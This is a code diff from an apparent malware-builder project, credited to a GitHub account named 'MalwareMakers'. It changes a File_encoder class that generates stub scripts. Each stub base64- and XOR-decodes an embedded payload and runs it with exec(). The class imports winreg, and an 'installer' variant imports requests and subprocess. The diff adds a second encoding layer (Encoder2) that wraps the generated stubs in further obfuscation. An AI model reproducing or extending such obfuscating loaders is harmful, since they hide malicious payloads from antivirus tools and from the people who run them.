@@ -2,6 +2,7 @@
 # Github : https://github.com/MalwareMakers
 
 import base64
+from src.file_encoder2 import *
 
 class File_encoder: 
     def __init__(self,code,type1): 
@@ -36,6 +37,8 @@ import json
 import winreg as reg
 import base64
 
+
+
 script = b'{base64_encoded_code}'
 key = '{self.key}'
 
@@ -49,10 +52,13 @@ encoded_code = base64.b64decode(script.decode()).decode()
 decoded_code = xor_decode(encoded_code, key)
 exec(decoded_code)
 '''
-            return script
+            encoding = Encoder2(code=script, code_type=self.type1)
+            src1 = encoding.Encoding()
+
+            return src1
     
         elif self.type1.lower() == "installer":
-            script = rf'''
+            script1 = rf'''
 import requests
 import subprocess
 import os
@@ -76,6 +82,11 @@ encoded_code = base64.b64decode(script.decode()).decode()
 decoded_code = xor_decode(encoded_code, key)
 exec(decoded_code)
 '''
+            encoding = Encoder2(code=script1, code_type=self.type1)
+            src2 = encoding.Encoding()
+
+            return src2
+
 
 
 key = "mysecretkey"
